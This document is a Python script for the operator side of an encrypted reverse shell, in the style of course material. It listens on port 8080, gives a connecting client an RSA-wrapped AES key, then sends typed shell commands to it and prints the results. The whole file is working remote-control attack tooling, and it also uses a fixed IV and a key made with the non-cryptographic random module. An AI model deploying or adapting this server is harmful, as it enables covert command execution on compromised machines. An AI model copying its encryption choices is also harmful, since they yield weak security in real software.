#!/usr/bin/env python
# Filename: rsa_rshell_server.py
# This program is optimized for Python 3.4
# Description: Raw socket protected messsage/data exchange server with RSA encryption
#   counterpart: aes_rshell_client.py

import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random

IV = b"H" * 16
key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 32))


def SEND_AES(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
<insert public RSA key>
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.bind(('192.168.0.152', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()
    print(key.encode())
    conn.send(SEND_AES(key.encode()))

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result).decode())
            except:
                print("[-] unable to decrypt/receive data!")

connect()

